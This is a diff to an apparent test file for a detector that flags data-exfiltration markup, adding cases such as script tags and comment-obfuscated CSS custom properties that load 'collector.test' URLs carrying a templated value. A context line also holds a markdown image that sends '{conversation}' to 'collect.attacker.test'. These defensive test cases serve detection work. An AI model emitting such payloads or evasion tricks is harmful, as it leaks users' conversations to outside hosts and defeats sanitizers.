@@ -682,6 +682,16 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<script type='module' src='https://collector.test/{c}.js'></script>", ["exfiltration_query"]),
         ("<script language='javascript' src='https://collector.test/{c}.js'></script>", ["exfiltration_query"]),
         ("<script language='vbscript' src='https://collector.test/{c}.js'></script>", []),
+        ("<script type='' language='vbscript' src='https://collector.test/{c}.js'></script>", ["exfiltration_query"]),
+        (
+            "<div style=\"--u/**/:'https://collector.test/{c}.png';background-image:image-set(var(--u) 1x)\">x</div>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<style>.a{--u /* x */ :'https://collector.test/{c}.png';background-image:image-set(var(--u) 1x)}</style>",
+            ["exfiltration_query"],
+        ),
+        ("<style>.a{--u/**/:'Inter';font-family:var(--u);content:'https://docs.test/{id}'}</style>", []),
         ("<svg><rect><set attributeName='href' to='https://collector.test/{c}.png'/></rect></svg>", []),
         (
             "<svg><use><set attributeName='href' to='https://collector.test/{c}.svg#x'/></use></svg>",
